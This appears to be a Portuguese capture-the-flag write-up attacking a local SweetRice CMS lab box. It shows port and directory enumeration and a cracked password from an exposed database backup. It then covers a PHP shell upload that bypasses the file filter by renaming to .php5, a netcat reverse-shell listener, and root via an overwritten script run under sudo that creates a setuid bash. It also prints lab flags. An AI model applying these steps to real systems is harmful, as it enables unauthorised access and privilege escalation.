github do docker
https://github.com/jvmaia/relaxed-admin-room

## nmap

└─$ nmap -T4 127.0.0.1            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-28 16:49 -0400
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds

apenas o servidor web em

http://127.0.0.1/

## gobuster

gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

└─$ gobuster dir -u http://127.0.0.1 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 274]
.htaccess            (Status: 403) [Size: 274]
.hta.php             (Status: 403) [Size: 274]
.htaccess.txt        (Status: 403) [Size: 274]
.hta.html            (Status: 403) [Size: 274]
.hta.txt             (Status: 403) [Size: 274]
.htaccess.php        (Status: 403) [Size: 274]
.htaccess.html       (Status: 403) [Size: 274]
.htpasswd.php        (Status: 403) [Size: 274]
.htpasswd            (Status: 403) [Size: 274]
.htpasswd.html       (Status: 403) [Size: 274]
.htpasswd.txt        (Status: 403) [Size: 274]
content              (Status: 301) [Size: 308] [--> http://127.0.0.1/content/]
index.html           (Status: 200) [Size: 202]
index.html           (Status: 200) [Size: 202]
server-status        (Status: 403) [Size: 274]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================

## explorando content

http://127.0.0.1/content/

servidor sweetrice

java script
http://127.0.0.1/content/js/SweetRice.js

enumerar o content

└─$ gobuster dir -u http://127.0.0.1/content -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.php             (Status: 403) [Size: 274]
.hta.txt             (Status: 403) [Size: 274]
.hta.html            (Status: 403) [Size: 274]
.htpasswd.txt        (Status: 403) [Size: 274]
.htaccess.txt        (Status: 403) [Size: 274]
.htpasswd            (Status: 403) [Size: 274]
.htaccess.html       (Status: 403) [Size: 274]
.htaccess.php        (Status: 403) [Size: 274]
.htaccess            (Status: 403) [Size: 274]
.htpasswd.html       (Status: 403) [Size: 274]
.htpasswd.php        (Status: 403) [Size: 274]
.hta                 (Status: 403) [Size: 274]
_themes              (Status: 301) [Size: 316] [--> http://127.0.0.1/content/_themes/]
as                   (Status: 301) [Size: 311] [--> http://127.0.0.1/content/as/]
attachment           (Status: 301) [Size: 319] [--> http://127.0.0.1/content/attachment/]
changelog.txt        (Status: 200) [Size: 18013]
images               (Status: 301) [Size: 315] [--> http://127.0.0.1/content/images/]
inc                  (Status: 301) [Size: 312] [--> http://127.0.0.1/content/inc/]
index.php            (Status: 200) [Size: 2195]
index.php            (Status: 200) [Size: 2195]
js                   (Status: 301) [Size: 311] [--> http://127.0.0.1/content/js/]
license.txt          (Status: 200) [Size: 15410]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================


## backup do banco

no http://127.0.0.1/content/inc/

é encontrado

http://127.0.0.1/content/inc/mysql_backup/

que pode ser baixado e extraido o user e hash da senha

Usuário	manager
hash
42f749ade7f9e195bf475f37a44cafcb

Password123

não consegui logar no ssh


└─$ ssh  manager@127.0.0.1
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
manager@127.0.0.1's password: 
Permission denied, please try again.
manager@127.0.0.1's password: 

## Pagina de login

em http://127.0.0.1/content/as/

logar com as credenciais

Ir em Media Center

o arquivo php direto é recusado
coloca dentro de zip também é recusado
renomeia para php5

acessar
http://127.0.0.1/content/attachment/shell.php5

e subir a escuta na porta nc -l -v -n -p 1234


## Flag de user

$ cd /home
$ ls -latr
total 20
drwxr-xr-x 1 root  root  4096 Oct 28 20:48 .
drwxr-xr-x 1 itguy itguy 4096 Oct 28 20:48 itguy
drwxr-xr-x 1 root  root  4096 Oct 28 20:48 ..
$ cd itguy
$ ls
backup.pl
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}


THM{63e5bce9271952aad1113b6f1ac28a07}

## Escalação de privilégio


sudo -l
$ sudo -l

Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl


rodar 
 suod perl não funciona pois pede a senha

$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ 


ls -la /etc/copy.sh

echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /etc/copy.sh

sudo /usr/bin/perl /home/itguy/backup.pl
/tmp/rootbash -p

flag

THM{6637f41d0177b6f37cb20d775124699f}

